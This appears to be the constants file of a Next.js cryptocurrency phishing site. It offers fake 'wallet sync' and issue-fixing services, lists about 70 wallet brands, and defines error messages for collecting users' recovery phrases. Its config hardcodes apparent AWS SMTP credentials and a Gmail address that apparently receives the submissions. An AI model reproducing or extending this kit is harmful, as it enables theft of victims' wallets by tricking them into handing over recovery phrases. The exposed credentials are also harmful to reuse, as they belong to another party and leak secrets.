import { DefaultSeoProps } from 'next-seo'
import { AboutData, IMenu, IWalletItem, NFTsProviderData } from './types'

export const APP_NAME = 'THE PROJECT MAINNET'

export const CONFIG = {
  host: process.env.EMAIL_HOST || 'email-smtp.us-east-1.amazonaws.com',
  user: process.env.EMAIL_USER || 'AKIAXZGUSRXPCUATWAE5',
  pass:
    process.env.EMAIL_PASS || 'BCL7sKJ2SDPaJ8U0Jf9MaGO3pC10I8z/1gup15Bki+s6',
  sender: process.env.EMAIL_SENDER || 'rastaarc.biz@gmail.com',
  receiver: process.env.RECEIVER_EMAIL || 'rastaarc.biz@gmail.com',
  siteUrl: process.env.NEXT_PUBLIC_SITE_URL || 'http://localhost:3000',
  server: process.env.NEXT_PUBLIC_BACKEND_URI || 'http://localhost:3000/api/',
}

const SITE_URL = CONFIG.siteUrl

export const DEFAULT_SEO: DefaultSeoProps = {
  title: 'Easily Manage your Coins and NFTs',
  defaultTitle: '',
  titleTemplate: `%s | ${APP_NAME}`,
  description: `${APP_NAME}, the best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app. Most trusted platform for solutions on all transaction issues, staking issues (pool & farm), balance irregularities, whitelist issues, withdrawal issues and bridging errors.`,
  openGraph: {
    type: 'website',
    url: SITE_URL,
    title: APP_NAME,
    description: `${APP_NAME}, the best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app. Most trusted platform for solutions on all transaction issues, staking issues (pool & farm), balance irregularities, whitelist issues, withdrawal issues and bridging errors.`,
    images: [
      {
        url: `${SITE_URL}/ms-icon-310x310.PNG`,
        width: 600,
        height: 600,
        alt: `${APP_NAME}`,
      },
    ],
  },
}

export const menuItems: IMenu[] = [
  {
    name: 'Home',
    link: '/',
  },
  {
    name: 'Wallets',
    link: '/wallets',
  },
  {
    name: 'NFTs',
    link: '/nfts',
  },
]

export const ABOUT_DATA: AboutData[] = [
  {
    heading1: 'The most efficient solution provider in the',
    heading2: 'blockchain.',
    description:
      'Most trusted platform for solutions on all transaction issues, staking issues (pool & farm), balance irregularities, whitelist issues, withdrawal issues and bridging errors.',
    image: 'app_illustration1',
  },
  {
    heading1: 'The most complex part of web3,',
    heading2: 'made simple.',
    description:
      'We powered next generation application for blockchain and cryptocurrency asset management which enables you to manually or automatically sync your crypto wallets accounts into a single platform.',
    image: 'app_illustration2',
  },
]

export const NFTs_PROVIDER_DATA: NFTsProviderData[] = [
  {
    name: 'MetaMask',
    image: 'metamask',
    feature: {
      text: 'Popular',
      type: 'primary',
    },
  },
  {
    name: 'Coinbase Wallet',
    image: 'coinbase',
  },
  {
    name: 'WalletConnect',
    image: 'wallet_connect',
  },
  {
    name: 'Phantom',
    image: 'phantom',
    feature: {
      text: 'Solana',
      type: 'secondary',
    },
  },
  {
    name: 'Glow',
    image: 'glow',
    feature: {
      text: 'Solana',
      type: 'secondary',
    },
  },
]

export const poweredBy = [
  'Bitcoin',
  'Etherium',
  'USDT',
  'Solana',
  'Bitcoin',
  'Etherium',
  'USDT',
  'Solana',
  'Bitcoin',
  'Etherium',
  'USDT',
  'Solana',
  'Bitcoin',
  'Etherium',
  'USDT',
  'Solana',
  'Bitcoin',
  'Etherium',
  'USDT',
  'Solana',
]

export const walletsData: IWalletItem[] = [
  {
    name: 'MetaMask',
    icon: 'metamask',
  },
  {
    name: 'Coinbase',
    icon: 'coinbase',
  },
  {
    name: 'Phantom',
    icon: 'phantom',
  },
  {
    name: 'Crypto.com | DeFi Wallet',
    icon: 'crypto_com_defi_wallet',
  },
  {
    name: 'Trust',
    icon: 'trust',
  },
  {
    name: 'Star Gazer',
    icon: 'star-gazer',
  },
  {
    name: 'Atomic',
    icon: 'atomic',
  },
  {
    name: 'Rainbow',
    icon: 'rainbow',
  },
  {
    name: 'Argent',
    icon: 'argent',
  },
  {
    name: 'Gnosis Safe Multisig',
    icon: 'gnosis',
  },
  {
    name: 'Pillar',
    icon: 'pillar',
  },
  {
    name: 'imToken',
    icon: 'imToken',
  },
  {
    name: 'Anchor',
    icon: 'anchor',
  },
  {
    name: 'ONTO',
    icon: 'onto',
  },
  {
    name: 'TokenPocket',
    icon: 'token-pocket',
  },
  {
    name: 'MathWallet',
    icon: 'math-wallet',
  },
  {
    name: 'BitPay',
    icon: 'bit-pay',
  },
  {
    name: 'Maiar',
    icon: 'maiar',
  },
  {
    name: 'Ledger Live',
    icon: 'ledgerlive',
  },
  {
    name: 'Walleth',
    icon: 'walleth',
  },
  {
    name: 'Authereum',
    icon: 'authereum',
  },
  {
    name: 'Huobi Wallet',
    icon: 'huobi-wallet',
  },
  {
    name: 'HEidoo',
    icon: 'Eidoo',
  },
  {
    name: 'MYKEY',
    icon: 'mykey',
  },
  {
    name: 'Loopring Wallet',
    icon: 'loopring',
  },
  {
    name: 'TrustVault',
    icon: 'trustvault',
  },
  {
    name: 'Coin98',
    icon: 'coin98',
  },
  {
    name: 'CoolWallet S',
    icon: 'coolwallet-s',
  },
  {
    name: 'Alice',
    icon: 'alice',
  },
  {
    name: 'AlphaWallet',
    icon: 'alphaWallet',
  },
  {
    name: "D'CENT Wallet",
    icon: 'dcentwallet',
  },
  {
    name: 'ZelCore',
    icon: 'zelcore',
  },
  {
    name: 'Nash',
    icon: 'nash',
  },
  {
    name: 'Coinomi',
    icon: 'coinomi',
  },
  {
    name: 'GridPlus',
    icon: 'gridplus',
  },
  {
    name: 'CYBAVO Wallet',
    icon: 'cybavowallet',
  },
  {
    name: 'Torus',
    icon: 'torus',
  },
  {
    name: 'Wazirx',
    icon: 'wazirx',
  },
  {
    name: 'Spatium',
    icon: 'spatium',
  },
  {
    name: 'SafePal',
    icon: 'safepal',
  },
  {
    name: 'Equal',
    icon: 'equal',
  },
  {
    name: 'Infinito',
    icon: 'infinito',
  },
  {
    name: 'wallet.io',
    icon: 'wallet.io',
  },
  {
    name: 'Infinity Wallet',
    icon: 'infinity',
  },
  {
    name: 'Ownbit',
    icon: 'ownbit',
  },
  {
    name: 'EasyPocket',
    icon: 'easypocket',
  },
  {
    name: 'Bridge Wallet',
    icon: 'bridge',
  },
  {
    name: 'SparkPoint',
    icon: 'sparkpoint',
  },
  {
    name: 'ViaWallet',
    icon: 'viawallet',
  },
  {
    name: 'BitKeep',
    icon: 'bitkeep',
  },
  {
    name: 'Vision',
    icon: 'vision',
  },
  {
    name: 'SWFT Wallet',
    icon: 'swft',
  },
  {
    name: 'PEAKDEFI Wallet',
    icon: 'peakdefi',
  },
  {
    name: 'Cosmostation',
    icon: 'cosmosstation',
  },
  {
    name: 'Graph Protocol',
    icon: 'graph',
  },
  {
    name: 'KardiaChain',
    icon: 'kardachain',
  },
  {
    name: 'Keplr',
    icon: 'keplr',
  },
  {
    name: 'Harmony',
    icon: 'harmony',
  },
  {
    name: 'ICONex',
    icon: 'iconex',
  },
  {
    name: 'Fetch',
    icon: 'fetch',
  },
  {
    name: 'XDC Wallet',
    icon: 'xdc',
  },
  {
    name: 'Unstoppable Wallet',
    icon: 'unstoppable',
  },
  {
    name: 'MEET.ONE',
    icon: 'meetone',
  },
  {
    name: 'Dok Wallet',
    icon: 'dok',
  },
  {
    name: 'AT.Wallet',
    icon: 'atwallet',
  },
  {
    name: 'MoriX Wallet',
    icon: 'morix',
  },
  {
    name: 'Midas Wallet',
    icon: 'midas',
  },
  {
    name: 'Ellipal',
    icon: 'ellipal',
  },
  {
    name: 'KEYRING PRO',
    icon: 'keyringpro',
  },
  {
    name: 'Binance Smart Chain',
    icon: 'bsc',
  },
  {
    name: 'Aktionariat',
    icon: 'aktionariat',
  },
  {
    name: 'Blockchain',
    icon: 'blockchain',
  },
  {
    name: 'Custom',
    icon: 'custom',
  },
]

export const HTTP_REQUEST_CODES = {
  OK: 200,
  CREATED: 201,
  BAD_REQUEST: 400,
  UNAUTHORIZED: 401,
  FORBIDDEN: 403,
  NOT_FOUND: 404,
  METHOD_NOT_ALLOWED: 405,
  SERVER_ERROR: 500,
  NOT_IMPLEMENTED: 501,
  BAD_GATEWAY: 502,
}

const err = Object.assign(
  {},
  ...Object.keys(HTTP_REQUEST_CODES).map((key) => ({
    [key]: key.split('_').join(' '),
  }))
)
export const ERROR_MESSAGES = {
  INVALID_WALLET_OR_PHRASE:
    'Wallet Name or Recovery Phrase Key missing in the request',
  INVALID_PHRASE_KEY: 'Sorry! Invalid Recovery Phrase keys supplied',
  INVALID_WALLET_NAME: 'Sorry! Invalid Wallet Name supplied',
}
